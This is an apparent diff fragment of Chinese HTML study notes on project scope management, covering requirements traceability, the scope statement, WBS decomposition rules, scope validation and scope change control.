-<h5 id="需求跟踪的内容"><a href="#需求跟踪的内容" class="headerlink" title="需求跟踪的内容"></a>需求跟踪的内容</h5><p>&emsp;&emsp;每个配置项的需求到其涉及的产品（或构件）需求都要具有双向可跟踪性。所谓<font color="red"><strong>双向跟踪</strong></font>， 包括正向跟踪和反向跟踪， 正向跟踪是指检查需求文件中的每个需求是否都能在后继工作产品（成果） 中找到对应点；反向跟踪也称为逆向跟踪， 是指检查设计文档、产品构件、测试文档等工作成果是否都能在需求文件中找到出处。具体来说， 需求跟踪涉及五种类型， 如图5-1所示。</p>
-<p><img src="https://s2.loli.net/2022/04/02/sbAizWrZJOt8hE5.png" alt="image-20220402150159966"></p>
-<p>&emsp;&emsp;<font color="red">箭头表示需求跟踪能力联系链， 它能跟踪需求使用的整个周期， 即从需求建议到交付的全过程。</font></p>
-<p>&emsp;&emsp;<font color="red">从用户原始需求可向前追溯到需求文件， 这样就能区分出项目过程中或项目结束后由千变更受到影响的需求， 也确保了需求文件中包括所有用户需求。同样， 可以从需求文件回溯到相应的用户原始需求， 确认每个需求的出处。</font></p>
-<h5 id="需求跟踪矩阵"><a href="#需求跟踪矩阵" class="headerlink" title="需求跟踪矩阵"></a>需求跟踪矩阵</h5><p>&emsp;&emsp;表示需求和其他产品元素之间的联系链的最普遍方式是使用需求跟踪（能力） 矩阵，需求跟踪矩阵是将产品需求从其来源连接到能满足需求的可交付成果的一种表格。</p>
-<p><img src="https://s2.loli.net/2022/04/02/SNiUlG9vICEWgzK.png" alt="image-20220402151047596"></p>
-<p>&emsp;&emsp;应在需求跟踪矩阵中记录每个需求的相关属性， 这些属性有助于明确每个需求的关键信息。需求跟踪矩阵中记录的典型属性包括唯—标识、需求的文字描述、收录该需求的理由、所有者、来源、优先级别、版本、<strong>当前状态（例如， 进行中、已取消、已推迟、新增加、已批准、已分配、已完成等）</strong>和状态日期。</p>
-<h3 id="定义范围（过程三）"><a href="#定义范围（过程三）" class="headerlink" title="定义范围（过程三）"></a>定义范围（过程三）</h3><p>&emsp;&emsp;定义范围(Define Scope)是制定项目和产品详细描述的过程， 其主要作用是明确所收集的需求哪些将包含在项目范围内， 哪些将排除在项目范围外， 从而明确产品、服务或成果的边界。</p>
-<h4 id="定义范围的工具与技术"><a href="#定义范围的工具与技术" class="headerlink" title="定义范围的工具与技术"></a>定义范围的工具与技术</h4><p>定义范围过程的主要工具与技术有<font color="red">专家判断、产品分析、 备选方案生成和引导式研讨会</font>。 </p>
-<font color="red">产品分析(Product Analysis)是—种有效的工具。通常， 针对产品提问并回答， 形成对将要开发的产品的用途、特征和其他方面的描述</font>
-
-<font color="red">备选方案生成(Alternatives Generation)是—种用来指定尽可能多的潜在可选方案的技术， 用千识别执行项目工作的不同方法。</font>
-
-<h4 id="范围说明书"><a href="#范围说明书" class="headerlink" title="范围说明书"></a>范围说明书</h4><p>&emsp;&emsp;作为<font color="red">定义范围过程的主要成果， 项目范围说明书(Project Scope Statement)</font>是对项目范围、主要可交付成果、假设条件和制约因素的描述。项目范围说明书记录了整个范围， 包括项目范围和产品范围， 详细描述项目的可交付成果， 以及为提交这些可交付成果而必须开展的工作。</p>
-<font color="red">项目范围说明书包括如下内容：</font>
-
-<ol>
-<li><font color="red">产品范围描述</font></li>
-<li><font color="red">验收标准。定义可交付成果通过验收前必须满足的一系列条件， 以及验收的过程。</font></li>
-<li><font color="red">可交付成果。</font></li>
-<li><font color="red">项目的除外责任。</font></li>
-<li><font color="red">制约因素。列出并说明与项目范围有关且限制项目团队选择的具体项目制约因素</font></li>
-<li><font color="red">假设条件。</font>
-
-</li>
-</ol>
-<p>项目范围说明书的主要作用如下:</p>
-<pre><code>(1)确定范围
-(2)沟通基础
-(3)规划和控制依据。
-(4)变更基础。
-(5)规划基础。
-</code></pre><h3 id="创建工作分解结构（过程四）"><a href="#创建工作分解结构（过程四）" class="headerlink" title="创建工作分解结构（过程四）"></a>创建工作分解结构（过程四）</h3><p>创建WBS是将项目可交付成果和项目工作分解成较小的、更易于管理的组件的过程</p>
-<h4 id="WBS的层次"><a href="#WBS的层次" class="headerlink" title="WBS的层次"></a>WBS的层次</h4><p>&emsp;&emsp;<font color="red">里程碑标志着某个可交付成果或者阶段的正式完成。重要的检查点是里程碑、重要的里程碑是基线</font></p>
-<p>&emsp;&emsp;<font color="red">工作包(Work Package)是位于WBS每条分支最底层的可交付成果或项目工作组成部分。工作包应该非常具体， 以便承担者能明确自己的任务、努力的目标和承担的责任。8/80规则(80小时原则）建议工作包的大小应该至少需要8小时来完成， 而总完成时间也不应该大于80小时。即工作一天（8小时）到两周（5X8X2=80小时）</font></p>
-<p>&emsp;&emsp;<strong>控制账户(Control Account) 是—种管理控制点。控制账户是WBS某个层次上的要素， 既可以是工作包， 也可以是比工作包更高层次上的一个要素。如果是后—种情况，一个控制账户中就包括若干个工作包， 但一个工作包仅属于一个控制账户。项目管理团队在控制账户上考核项目的执行情况， 即在控制账户的相应要素下， 将项目执行情况与计划情况进行比较， 以便评价执行情况好坏， 并发现与纠正偏差。</strong></p>
-<p>&emsp;&emsp;<strong>规划包(Planning Package)是指在控制账户之下，工作内容已知但尚缺详细进度活动的WBS组成部分。规划包是在控制账户之下、工作包之上的WBS要素。随着情况的逐渐清晰， 规划包最终将被分解成工作包以及相应的具体活动。</strong></p>
-<p>&emsp;&emsp;在制作WBS的过程中， 要给WBS的每个部分赋予—个账户编码(Code of Account)标志符， 它们是成本、进度和资源使用信息汇总的层次结构。需要生成—些配套的文件，这些文件需要和WBS配套使用， 称为WBS词典。WBS词典也称为WBS词汇表， 它是描述WBS各组成部分的文件。</p>
-<h4 id="分解"><a href="#分解" class="headerlink" title="分解"></a>分解</h4><p>创建WBS 过程的工具与技术主要有分解和专家判断。</p>
-<font color="red">要将整个项目工作分解为工作包， 通常需要开展以下活动：</font>
-
-<ol>
-<li><font color="red">识别和分析可交付成果及相关工作。</font></li>
-<li><font color="red">确定WBS的结构和编排方法。</font></li>
-<li><font color="red">自上而下逐层细化分解。</font></li>
-<li><font color="red">为WBS组件制定和分配标识编码。</font></li>
-<li><font color="red">核实可交付成果分解的程度是恰当的。</font>
-
-</li>
-</ol>
-<h5 id="分解的原则"><a href="#分解的原则" class="headerlink" title="分解的原则"></a>分解的原则</h5><p>创建WBS时对工作的划分， 可以参考一些现成的原则， 这些原则包括：</p>
-<pre><code>(1)功能或者技术原则。在创建WBS时，需要考虑将不同人员的工作分开。
-(2)组织结构。对于职能型的项目组织而言， WBS也要适应项目的组织结构形式，
-(3)系统或者子系统。总的系统划分为几个主要的子系统， 然后对每个子系统再进行分解。
-</code></pre><font color="red">在项目管理实践中， 可以按照下列方式进行分解：</font>
-
-<ol>
-<li><font color="red">项目生命周期的各阶段作为分解的第二层， 产品和项目可交付成果放在第三层</font></li>
-<li><font color="red">主要可交付成果作为分解的第二层（将子项目作为分解的第二层）</font>
-
-</li>
-</ol>
-<h5 id="工作过程"><a href="#工作过程" class="headerlink" title="工作过程"></a>工作过程</h5><font color="red">WBS不是某个项目团队成员的责任，应该由**全体项目团队成员、用户和项目干系人**共同完成和一致确认。</font>
-
-<font color="red">较常用的WBS表示形式主要有分级的树型结构（组织结构图式）和表格形式（列表式）。</font>
-
-<font color="red">树型结构图的WBS层次清晰、直观性和结构性强， 但不容易修改， 对大的、复杂的项目很难表示出项目的全貌；表格形式的直观性比较差，但能够反映出项目所有的工作要素。</font>
-
-<p>值得注意的是，虽然有些参考文献也使用鱼骨图形式的WBS，但这种形式并不常用。</p>
-<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><p>在分解的过程中 ， 应该注意以下8个方面：</p>
-<ol>
-<li><font color="red">WBS必须是面向可交付成果的</font>。项目的目标是提供产品或服务， 仅仅是—连串特别的活动。</li>
-<li><font color="red">WBS必须符合项目的范围。WBS必须包括， 也仅包括为了完成项目的可交付成果的活动。</font></font></li>
-<li>WBS的底层应该支持计划和控制。WBS是项目管理计划和项目范围之间的桥梁，WBS的底层不但要支持项目管理计划， 而且要让管理层能够监视和控制项目的进度和预算</li>
-<li><font color="red">WBS中的元素必须有人负责， 而且只由一个人负责， 尽管实际上可能需要多个人参与。</font></li>
-<li><font color="red">WBS的指导。作为指导而不是原则， WBS应控制在4~6层。</font></li>
-<li><font color="red">WBS应包括项目管理工作（因为管理是项目具体工作的一部分），也要包括分包出去的工作。</font></li>
-<li><font color="red">WBS的编制需要所有（主要）项目干系人的参与， 需要项目团队成员的参与。</font></li>
-<li>WBS 并非是— 成不变的。在完成了WBS 之后的工作中， 仍然有可能需要对WBS进行修改。</li>
-<li><font color="red">一个下层只可以有一个上层，一个上层可以有多个下层，避免交叉从属</font>
-
-</li>
-</ol>
-<h4 id="WBS的作用"><a href="#WBS的作用" class="headerlink" title="WBS的作用"></a>WBS的作用</h4><p>当一个项目的WBS分解完成后， 项目干系人对完成的WBS应该给予确认，WBS的目的和用途主要体现在以下8个方面：</p>
-<pre><code>(1)明确和准确说明项目范围，项目团队成员能够清楚地理解任务的性质和需要努力的方向。
-(2)清楚地定义项目的边界
-(3)为各独立单元分派人员，规定这些人员的职责，可以确定完成项目所需要的技术和人力资源。
-(4)针对独立单元，进行时间、成本和资源需求量的估算，提高估算的准确性。
-(5)为计划、预算、进度安排和费用控制奠定共同基础，确定项目进度和控制的基准。
-(6)将项目工作和项目的财务账目联系起来。
-(7)确定工作内容和工作顺序， 将项目分解成具体的工作任务，就可以按照工作任务的逻辑顺序来实施项目。WBS可以使用图形化的方式来查看工作内容，任何人都能够清楚地辨别项目的阶段、工作单元，并根据实际情况进行调节和控制。
-(8)有助于防止需求蔓延。
-</code></pre><h3 id="确认范围（过程五）"><a href="#确认范围（过程五）" class="headerlink" title="确认范围（过程五）"></a>确认范围（过程五）</h3><p>确认范围(Validate Scope)是正式验收项目已完成的可交付成果的过程，确认范围包括与客户或发起人一起审查可交付成果， 确保可交付成果已圆满完成， 并获得客户或发起人的正式验收。</p>
-<h4 id="确认范围概述"><a href="#确认范围概述" class="headerlink" title="确认范围概述"></a>确认范围概述</h4><p>确认范围的主要工具与技术是检查和群体决策技术。检查也称为审查、 评审、审计、走查、 巡检、测试等</p>
-<h5 id="确认范围的步骤"><a href="#确认范围的步骤" class="headerlink" title="确认范围的步骤"></a>确认范围的步骤</h5><p>确认范围应该贯穿项目的始终，确认范围的一般步骤如下：</p>
-<pre><code>(1)确定需要进行范围确认的时间。
-(2)识别范围确认需要哪些投入。
-(3)确定范围正式被接受的标准和要素。
-(4)确定范围确认会议的组织步骤。
-(5)组织范围确认会议。
-</code></pre><h5 id="需要检查的问题"><a href="#需要检查的问题" class="headerlink" title="需要检查的问题"></a>需要检查的问题</h5><p>项目干系人进行范围确认时，一般需要检查以下6个方面的问题：</p>
-<pre><code>(1)可交付成果是否是确定的、可确认的。
-(2)每个可交付成果是否有明确的里程碑， 里程碑是否有明确的、可辨别的事件，例如， 客户的书面认可等。
-(3)是否有明确的质量标准
-(4)审核和承诺是否有清晰的表达。
-(5)项目范围是否覆盖了需要完成的产品或服务进行的所有活动， 有没有遗漏或者错误。
-(6)项目范围的风险是否太高， 管理层是否能够降低可预见的风险发生时对项目的冲击。
-</code></pre><h4 id="干系人关注点"><a href="#干系人关注点" class="headerlink" title="干系人关注点"></a>干系人关注点</h4><p>考过几次，可以关注一下：</p>
-<p>&emsp;&emsp;管理层所关注的项目范围， 是指范围对项目的进度、资金和资源的影响， 这些因素是否超过了组织承受范围， 是否在投入产出上具有合理性。</p>
-<p>&emsp;&emsp;客户主要关心的是产品的范围， 关心项目的可交付成果是否足够完成产品或服务。</p>
-<p>&emsp;&emsp;项目管理人员主要关注可交付成果是否足够和必须完成，时间、资金和资源是否足够，主要的潜在风险和预备解决的方法。</p>
-<p>&emsp;&emsp;项目团队成员主要关心项目范围中自己参与的元素和负责的元素， 通过定义范围中的时间检查自己的工作时间是否足够， 自己在项目范围中是否有多项工作， 而这些工作又有冲突的地方。</p>
-<h4 id="几个术语的比较"><a href="#几个术语的比较" class="headerlink" title="几个术语的比较"></a>几个术语的比较</h4><ol>
-<li><p>确认范围与核实产品<br>核实产品是针对产品是否完成， 在项目（或阶段）结束时由发起人或客户来验证，强调产品是否完整； 确认范围是针对项目可交付成果， 由客户或发起人在阶段末确认验收的过程。</p>
-</li>
-<li><p>确认范围与质量控制</p>
-<font color="red">确认范围与质量控制的不同之处在于：</font>
-
-<ul>
-<li><font color="red">确认范围主要强调可交付成果获得客户或发起人的接受；质量控制强调可交付成果的正确性， 并符合为其制定的具体质量要求（质量标准）。</font></li>
-<li><font color="red">质量控制一般在确认范围前进行，也可同时进行；确认范围一般在阶段末尾进行，而质量控制并不—定在阶段未进行。</font></li>
-<li><font color="red"><font color="red">质量控制属内部检查， 由执行组织的相应质量部门实施；确认范围则是由外部干系人（客户或发起人）对项目可交付成果进行检查验收。</font></li>
-</ul>
-</li>
-<li>确认范围与项目收尾<pre><code>确认范围与项目收尾的不同之处在于：
-- 虽然确认范围与项目收尾工作都在阶段未进行， 但确认范围强调的是核实与接受
-    可交付成果， 而项目收尾强调的是结束项目（或阶段）所要做的流程性工作。
-- 确认范围与项目收尾都有验收工作， 确认范围强调验收项目可交付成果， 项目收
-    尾强调验收产品。
-</code></pre></li>
-</ol>
-<h3 id="控制范围（过程六）"><a href="#控制范围（过程六）" class="headerlink" title="控制范围（过程六）"></a>控制范围（过程六）</h3><p>控制范围(Control Scope)是监督项目和产品的范围状态、管理范围基准变更的过程</p>
-<h4 id="范围变更的原因"><a href="#范围变更的原因" class="headerlink" title="范围变更的原因"></a>范围变更的原因</h4><p>造成项目范围变更的主要原因是项目外部环境发生了变化， 例如：</p>
-<ul>
-<li><font color="red">政府政策的问题。</font></li>
-<li><font color="red">项目范围的计划编制不周密详细， 有—定的错误或遗漏。</font></li>
-<li><font color="red">市场上出现了或是设计人员提出了新技术、新手段或新方案。</font></li>
-<li><font color="red">项目执行组织本身发生变化。</font></li>
-<li><font color="red">客户对项目、项目产品或服务的要求发生变化。</font>
-
-</li>
-</ul>
-<h4 id="范围变更的工作"><a href="#范围变更的工作" class="headerlink" title="范围变更的工作"></a>范围变更的工作</h4><p>范围变更控制的主要工作如下：</p>
-<ol>
-<li>影响导致范围变更的因素， 并尽量使这些因素向有利的方面发展。</li>
-<li>判断范围变更是否已经发生。</li>
-<li>范围变更发生时管理实际的变更，确保所有被请求的变更按照项目整体变更控制过程处理。</li>
 </ol>
 ]]></content>
       <categories>
